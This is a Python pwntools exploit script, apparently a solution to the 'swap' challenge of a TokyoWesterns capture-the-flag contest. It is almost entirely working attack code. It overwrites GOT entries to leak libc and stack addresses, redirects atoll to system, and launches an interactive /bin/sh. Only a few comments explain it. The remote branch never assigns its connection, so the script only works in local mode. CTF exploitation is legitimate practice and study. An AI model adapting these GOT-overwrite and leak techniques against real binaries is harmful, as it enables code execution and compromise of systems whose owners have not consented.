from pwn import *

local = True

got_exit = 0x601058
got_sleep = 0x601060
got_puts = 0x601018
got_atoi = 0x601050
got_atoll = 0x601038

buf_offset = 0x7fffffffe640-0x7fffffffe480

system_offset = 0x7ffff7dd2641-0x7ffff7a52390

if local:
	r = process("./swap-b878cc5ecf612cee902acdc91054486bb4cb3bb337a0cfbaf903ba8d35cfcd17")
else:
	remote("pwn1.chal.ctf.westerns.tokyo", 19937)


def menu(p=False):
	s = r.recvuntil("choice:")
	if p:
		print(s)
	return s

def set_swap(a, b):
	r.send("1")
	r.recvuntil("1st addr\n")
	r.sendline(str(a))
	r.recvuntil("2nd addr\n")
	r.sendline(str(b))

def swap(payload=None):
	if payload is None:
		r.send("2")
	else:
		r.send(payload)

menu()

set_swap(got_exit, got_sleep)
menu()
swap()
menu()

# swap puts and atoi in order to leak stack and libc addresses
set_swap(got_puts, got_atoi)
menu()
swap()

r.send("A")
r.recvline()
s = r.recvline()
libc_rw_addr = u64(s[0:6].ljust(8, "\x00"))

info("LEAK: libc rw = %s" % hex(libc_rw_addr))

r.send("A"*8)
s = r.recvline()
stack_addr = u64(s[8:14].ljust(8, "\x00"))

info("LEAK: stack = %s" % hex(stack_addr))

# return 2 from puts to swap again
r.send("A\x00")
menu()

system_addr = libc_rw_addr - system_offset
info("system = %s" % hex(system_addr))

# atoll = system
set_swap(stack_addr-buf_offset+8, got_atoll)
menu()
swap("2" + "\x00"*7 + p64(system_addr))
menu()

r.sendline("1")
r.recvuntil("1st addr")
r.sendline("/bin/sh")

r.interactive()
